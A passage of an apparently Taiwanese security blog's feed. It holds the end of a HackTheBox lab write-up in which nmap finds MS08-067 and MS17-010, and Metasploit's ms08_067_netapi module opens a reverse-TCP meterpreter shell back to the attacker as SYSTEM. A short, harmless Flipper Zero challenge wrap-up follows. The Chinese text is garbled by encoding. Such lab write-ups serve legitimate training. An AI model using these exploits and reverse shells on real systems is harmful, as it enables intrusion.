data-rel="Plaintext"><figure class="iseeu highlight plaintext"><figcaption><span>Agents:0) exploit(windows/smb/ms17_010_psexec) >> exploit</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.30:4444 </span><br><span class="line">[*] 10.129.152.110:445 - Target OS: Windows 5.1</span><br><span class="line">[-] 10.129.152.110:445 - Unable to find accessible named pipe!</span><br><span class="line">^[c[*] Exploit completed, but no session was created.1</span><br></pre></td></tr></table></figure></div>è¶…æ€ªï¼Œç¶²è·¯ä¸Šçœ‹åˆ°æœ‰äººç”¨é€™å€‹æ´æ‰“é€²å»ï¼Œä½†æ˜¯çœ‹åˆ°æœ‰äº›äººæ˜¯æ‰“ netbios çš„æ´ï¼Œè€Œä¸”ä»–å€‘ç”¨ <code>nmap</code> ç”¨ä¸€æ¨£çš„æŒ‡ä»¤æœ‰æƒåˆ° CVE-2008-4250 è¶…æ€ªã€‚<br>çµæœæ©Ÿå™¨é‡é–‹ä¹‹å¾Œå°±æœ‰äº†ï¼Ÿï¼Ÿï¼Ÿ<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">â””â”€â”€â•¼ [â˜…]$ nmap --script vuln 10.129.227.181</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-27 05:52 CDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.129.227.181</span><br><span class="line">Host is up (0.077s latency).</span><br><span class="line">Not shown: 997 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">135/tcp open  msrpc</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-vuln-ms08-067: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Microsoft Windows system vulnerable to remote code execution (MS08-067)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2008-4250</span><br><span class="line">|           The Server service <span class="keyword">in</span> Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,</span><br><span class="line">|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary</span><br><span class="line">|           code via a crafted RPC request that triggers the overflow during path canonicalization.</span><br><span class="line">|           </span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2008-10-23</span><br><span class="line">|     References:</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250</span><br><span class="line">|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx</span><br><span class="line">|_smb-vuln-ms10-054: <span class="literal">false</span></span><br><span class="line">|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED</span><br><span class="line">| smb-vuln-ms17-010: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability <span class="keyword">in</span> Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2017-0143</span><br><span class="line">|     Risk <span class="built_in">factor</span>: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists <span class="keyword">in</span> Microsoft SMBv1</span><br><span class="line">|        servers (ms17-010).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure <span class="built_in">date</span>: 2017-03-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br><span class="line">|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 28.00 seconds</span><br></pre></td></tr></table></figure></div>è¶…è ¢çµæœæ©Ÿå™¨é‡é–‹å°±æœ‰äº†ï¼š<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">â””â”€â”€â•¼ [â˜…]$ msfconsole</span><br><span class="line">Metasploit tip: Use the edit <span class="built_in">command</span> to open the currently active module </span><br><span class="line"><span class="keyword">in</span> your editor</span><br><span class="line">                                                  </span><br><span class="line">     ,           ,</span><br><span class="line">    /             \</span><br><span class="line">   ((__---,,,---__))</span><br><span class="line">      (_) O O (_)_________</span><br><span class="line">         \ _ /            |\</span><br><span class="line">          o_o \   M S F   | \</span><br><span class="line">               \   _____  |  *</span><br><span class="line">                |||   WW|||</span><br><span class="line">                |||     |||</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v6.3.44-dev                          ]</span><br><span class="line">+ -- --=[ 2376 exploits - 1232 auxiliary - 416 post       ]</span><br><span class="line">+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit Documentation: https://docs.metasploit.com/</span><br><span class="line"></span><br><span class="line">[msf](Jobs:0 Agents:0) &gt;&gt; search CVE-2008-4250</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                 Disclosure Date  Rank   Check  Description</span></span><br><span class="line">   -  ----                                 ---------------  ----   -----  -----------</span><br><span class="line">   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/ms08_067_netapi</span><br><span class="line"></span><br><span class="line">[msf](Jobs:0 Agents:0) &gt;&gt; use 0</span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) &gt;&gt; <span class="built_in">set</span> lhost tun0</span><br><span class="line">lhost =&gt; tun0</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) &gt;&gt; <span class="built_in">set</span> rhost 10.129.227.181</span><br><span class="line">rhost =&gt; 10.129.227.181</span><br><span class="line">[msf](Jobs:0 Agents:0) exploit(windows/smb/ms08_067_netapi) &gt;&gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.30:4444 </span><br><span class="line">[*] 10.129.227.181:445 - Automatically detecting the target...</span><br><span class="line">[*] 10.129.227.181:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English</span><br><span class="line">[*] 10.129.227.181:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)</span><br><span class="line">[*] 10.129.227.181:445 - Attempting to trigger the vulnerability...</span><br><span class="line">[*] Sending stage (175686 bytes) to 10.129.227.181</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.30:4444 -&gt; 10.129.227.181:1039) at 2024-10-27 05:55:37 -0500</span><br><span class="line"></span><br><span class="line">(Meterpreter 1)(C:\WINDOWS\system32) &gt; <span class="built_in">id</span> </span><br><span class="line">[-] Unknown <span class="built_in">command</span>: <span class="built_in">id</span></span><br><span class="line">(Meterpreter 1)(C:\WINDOWS\system32) &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure></div></li></ul><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/legacy_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å¾ä»Šå¤©é–‹å§‹æƒ³è¦åœ¨è€ƒ OSCP å‰åˆ·ä¸€ä¸‹ HackTheBox ä¸­è·Ÿ OSCP è­‰ç…§æ¯”è¼ƒç›¸é—œçš„æ©Ÿå™¨ï¼š&lt;br&gt;&lt;a class=&quot;link&quot;   href=&quot;https://github.com/rkhal101/Hack-the-Box-OSCP-Preparation&quot; &gt;</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="machines" scheme="https://kazma.tw/tags/machines/"/>
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="pt" scheme="https://kazma.tw/tags/pt/"/>
    
    <category term="windows" scheme="https://kazma.tw/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>Flipper Zero å®‡å®™æœ€å¼·æ”»ç•¥ï¼š30 å¤©å¸¶ä½ å¾å…¥é–€åˆ°å…¥å‘ Day30 - æœªå®Œå¾…çºŒï¼æ’²æœ”è¿·é›¢çš„åä¸€æœˆé å‘Šä¿¡ï¼Ÿ</title>
    <link href="https://kazma.tw/2024/10/14/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day30/"/>
    <id>https://kazma.tw/2024/10/14/Flipper-Zero-%E5%AE%87%E5%AE%99%E6%9C%80%E5%BC%B7%E6%94%BB%E7%95%A5%EF%BC%9A30-%E5%A4%A9%E5%B8%B6%E4%BD%A0%E5%BE%9E%E5%85%A5%E9%96%80%E5%88%B0%E5%85%A5%E5%9D%91-Day30/</id>
    <published>2024-10-14T07:13:51.887Z</published>
    <updated>2024-10-29T03:22:04.373Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å¥èº«æµ·è±šæ•™ç·´"><a href="#å¥èº«æµ·è±šæ•™ç·´" class="headerlink" title="å¥èº«æµ·è±šæ•™ç·´"></a>å¥èº«æµ·è±šæ•™ç·´</h2><p>ä¼°è¨ˆæ˜¯åšä¸å®Œäº†XD<br>æ‰€ä»¥ç°¡å–®èªªä¸€ä¸‹ä¹‹å¾Œé è¨ˆè¦æ€éº¼å®Œæˆï¼š<br>é¦–å…ˆæ˜¯åŠŸèƒ½çš„éƒ¨åˆ†ï¼Œæˆ‘å¸Œæœ›å¯ä»¥é€éäº‹å‰è¼¸å…¥èª²è¡¨ï¼ŒåŒ…æ‹¬æ¬¡æ•¸ã€çµ„æ•¸ã€çµ„é–“ä¼‘æ¯æ™‚é–“ã€ç„¶å¾Œæ¯æ¬¡å»å¥èº«çš„æ™‚å€™å°±å¯ä»¥é–‹å§‹èª²è¡¨ï¼Œç„¶å¾Œä»–æœƒå‘Šè¨´æˆ‘ç¾åœ¨è¦åšçš„å‹•ä½œåç¨±ï¼Œæ¬¡æ•¸å’Œçµ„æ•¸ï¼Œç„¶å¾Œæˆ‘åšå®Œä¹‹å¾ŒæŒ‰ä¸‹ Finish å°±å¯ä»¥é–‹å§‹å€’æ•¸çµ„é–“ä¼‘ï¼Œæ™‚é–“å€’æ•¸å®Œå°±æœƒè·³ä¸€å€‹ popup äº”ç§’å¾Œæ¶ˆå¤±ï¼Œå«æˆ‘å€‘è¶•å¿«åšä¸‹ä¸€çµ„ç„¶å¾Œåšå®Œå†æŒ‰ Finish å¦‚æ­¤é‡è¤‡ã€‚<br>ç„¶å¾Œå¯ä»¥å„²å­˜ä¸åŒçš„èª²è¡¨ï¼Œä¹‹å¾Œæˆ‘å€‘å¯ä»¥å¾å·²å„²å­˜çš„åˆ—è¡¨é¸æ“‡ä»Šå¤©è¦è¨“ç·´çš„é …ç›®ã€‚</p><h2 id="å¿ƒå¾—"><a href="#å¿ƒå¾—" class="headerlink" title="å¿ƒå¾—"></a>å¿ƒå¾—</h2><p>çµ‚æ–¼åˆ°äº†æŒ‘æˆ°çš„æœ€å¾Œä¸€å¤©ï¼Œä¾†è¬›ä¸€äº›é—œæ–¼æŒ‘æˆ°çš„å¿ƒå¾—ã€‚<br>å¾ˆæ„Ÿè¬é€™å€‹æŒ‘æˆ°è®“æˆ‘å¯ä»¥é¤Šæˆæ¯å¤©å­¸ç¿’ä¸€å€‹æ–°æŠ€è¡“çš„ç¿’æ…£ï¼ŒåŸºæœ¬ä¸Šæ¯å¤©éƒ½æ˜¯åˆ°äº†æ™šä¸Š 21. å°±é–‹å§‹è¦æº–å‚™æ’°å¯«ç•¶å¤©çš„æ–‡ç« ï¼Œç„¶å¾Œå¹¾ä¹éƒ½åœ¨æˆªæ­¢å‰ååˆ†é˜é€å‡ºï¼Œå–åå­—çš„éƒ¨åˆ†ä¹Ÿæ˜¯èŠ±äº†é»å¿ƒæ€ï¼Œå› ç‚ºæœ¬èº«è¦ºå¾—å–åå­—æ˜¯ä¸€é–€è—è¡“ã€‚æœ€å¾Œç¢ºå¯¦ä¹Ÿç™¼æ˜äº†ä¸å°‘æœ‰è¶£çš„ Flipper Zero åŠŸèƒ½ï¼Œé›–ç„¶è‡ªå·±é æœŸèƒ½å¤ å¯«å‡ºæ›´æœ‰æŠ€è¡“æ·±åº¦çš„æ–‡ç« ï¼Œç”šè‡³æœ€å¾Œä¸€å¤©é è¨ˆæ˜¯è¦å®Œæ•´é–‹ç™¼ä¸€å€‹æ‡‰ç”¨ç¨‹å¼çš„ï¼Œä½†é€™å€‹æœˆçš„è¡Œç¨‹çœŸçš„æ˜¯å¤ªçˆ†ç‚¸ç·Šæ¹Šäº†ã€‚<br>é€™å€‹æŒ‘æˆ°çµæŸå¾Œï¼Œä¹Ÿé è¨ˆæ¯å¤©èŠ±å›ºå®šçš„æ™‚é–“é€²è¡ŒåŒä¸€å€‹ç ”ç©¶æˆ–æ˜¯é–±è®€æ‰‹é‚Šçš„æ›¸ç±ï¼Œå¸Œæœ›æ˜å¤©å¯ä»¥è·Ÿç‰›è‚‰æ¹¯çš„å¤¥ä¼´å€‘çµ„éšŠæ‹¿ä¸‹ä¸€äº›çé …ã€‚</p><h2 id="é å‘Šä¿¡"><a href="#é å‘Šä¿¡" class="headerlink" title="é å‘Šä¿¡"></a>é å‘Šä¿¡</h2><p>ä»Šå¹´åä¸€æœˆä»½çš„æ™‚å€™ï¼Œä½ å€‘é‚„æœƒå›åˆ°é€™è£¡ä¾†çš„ï½<br>æˆ‘å€‘åˆ°æ™‚å€™è¦‹ï¼<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/letter.png"                      alt="letter"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å¥èº«æµ·è±šæ•™ç·´&quot;&gt;&lt;a href=&quot;#å¥èº«æµ·è±šæ•™ç·´&quot; class=&quot;headerlink&quot; title=&quot;å¥èº«æµ·è±šæ•™ç·´&quot;&gt;&lt;/a&gt;å¥èº«æµ·è±šæ•™ç·´&lt;/h2&gt;&lt;p&gt;ä¼°è¨ˆæ˜¯åšä¸å®Œäº†XD&lt;br&gt;æ‰€ä»¥ç°¡å–®èªªä¸€ä¸‹ä¹‹å¾Œé è¨ˆè¦æ€éº¼å®Œæˆï¼š&lt;br&gt;é¦–å…ˆæ˜¯åŠŸèƒ½çš„éƒ¨åˆ†ï¼Œæˆ‘å¸Œæœ›å¯ä»¥é€éäº‹å‰è¼¸å…¥</summary>
      
    
    
    
    
    <category term="flipper-zero" scheme="https://kazma.tw/tags/flipper-zero/"/>
    
    <category term="iThome" scheme="https://kazma.tw/tags/iThome/"/>
    
    <category term="toy" scheme="https://kazma.tw/tags/toy/"/>
    
  </entry>
  
</feed>
